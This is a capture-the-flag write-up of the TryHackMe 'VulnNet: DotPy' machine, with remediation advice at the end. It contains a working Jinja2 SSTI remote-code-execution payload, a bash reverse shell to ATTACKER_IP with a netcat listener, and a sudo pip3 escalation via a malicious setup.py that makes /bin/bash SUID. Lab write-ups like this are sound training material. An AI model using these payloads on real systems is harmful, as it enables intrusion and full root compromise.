# VulnNet: DotPy — Penetration Testing Report

[📖 قراءة التقرير بالعربية](README_AR.md) | [English Version](README.md)
[📄 Original Report File (DOCX)](./VulnNet_DotPy_Report_EN.docx)

---

## 📋 Overview & Metadata

| Attribute | Details |
| :--- | :--- |
| **Target Machine** | VulnNet: DotPy (TryHackMe) |
| **Target OS** | Linux (Ubuntu 18.04) |
| **Difficulty** | Medium |
| **Assessment Type** | Web Application Pentest (Python/Flask) & Linux Privilege Escalation |
| **Key Vulnerabilities** | Server-Side Template Injection (SSTI / Jinja2), Sudo Misconfiguration (`pip3`), Python Module Hijacking |
| **Initial Foothold** | Jinja2 SSTI Remote Code Execution -> Shell as `web` |
| **Privilege Escalation** | `sudo pip3 install` / Custom `setup.py` Execution -> `root` |

---

## 🎯 Attack Chain

```mermaid
graph LR
    A["Nmap Scan (Port 8080 Werkzeug 1.0.1)"] --> B["Discover 404 Error Page Reflecting Input"]
    B --> C["Test Jinja2 SSTI: {{ 7*7 }} -> 49"]
    C --> D["Inject MRO Python RCE Payload"]
    D --> E["Reverse Shell as user 'web'"]
    E --> F["sudo -l Check: sudo pip3 install *"]
    F --> G["Craft Malicious setup.py and Execute"]
    G --> H["Full Root Shell (root)"]
```



---

## 🔍 Vulnerability Summary

| Vulnerability | Severity | Service / Port | Impact |
| :--- | :---: | :---: | :---: |
| **Server-Side Template Injection (SSTI)** | Critical | Port 8080 (Flask/Werkzeug) | Remote Code Execution via Python Jinja2 Engine |
| **Sudo Misconfiguration on pip3** | High | Local System (`/usr/bin/pip3`) | Local Privilege Escalation to Root |

---

## 🛠️ Technical Walkthrough

### Phase 1: Reconnaissance & Port Scanning

```bash
nmap -sV -sC -p- -T4 <TARGET_IP>
```
* **Open Port:** `8080/tcp` — Werkzeug httpd 1.0.1 (Python 3.6.9).

### Phase 2: Vulnerability Analysis — Jinja2 SSTI

Exploring the web application at `http://<TARGET_IP>:8080/`. Testing non-existent routes triggers a 404 page that reflects user input back into the page.

Testing template expression evaluation:
```http
GET /{{7*7}} HTTP/1.1
Host: <TARGET_IP>:8080
```
Response renders:
```html
The page '49' could not be found.
```
This confirms **Jinja2 Server-Side Template Injection (SSTI)**.

### Phase 3: Exploiting SSTI for Initial Foothold

We traverse Python's Method Resolution Order (MRO) to reach `os.popen`:

```text
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
Executing a Bash reverse shell:
```text
{{request.application.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"').read()}}
```
Start a Netcat listener:
```bash
nc -lvnp 4444
```
Send the payload encoded via URL parameters. A reverse shell is received as user `web`.

### Phase 4: Linux Privilege Escalation via Sudo Pip3

Check permitted sudo commands:
```bash
sudo -l
```
Output:
```text
User web may run the following commands on vulnnet-dotpy:
    (root) NOPASSWD: /usr/bin/pip3 install *
```

When `pip install` executes a directory containing `setup.py`, it executes arbitrary Python code contained in the `setup()` call with root permissions.

1. Create a temporary directory and craft `setup.py`:
   ```bash
   mkdir /tmp/privesc && cd /tmp/privesc
   cat << 'EOF' > setup.py
   import setuptools
   import os
   os.system("chmod +s /bin/bash")
   setuptools.setup(name='privesc', version='1.0')
   EOF
   ```

2. Run `pip3 install` via `sudo`:
   ```bash
   sudo /usr/bin/pip3 install .
   ```

3. The SUID bit is now assigned to `/bin/bash`. Spawn a root shell:
   ```bash
   /bin/bash -p
   whoami
   root
   ```
Both `user.txt` and `root.txt` flags are captured!

---

## 🛡️ Remediation & Defensive Recommendations

1. **Avoid Rendering Untrusted Input in Templates:** Never pass user input directly into `render_template_string()`. Use static templates with strict data context variables (`render_template('404.html', error=user_input)`).
2. **Restrict Sudo Privileges:** Remove `pip3 install` from `sudoers`. Package installation should only occur through controlled maintenance scripts or CI/CD pipelines.
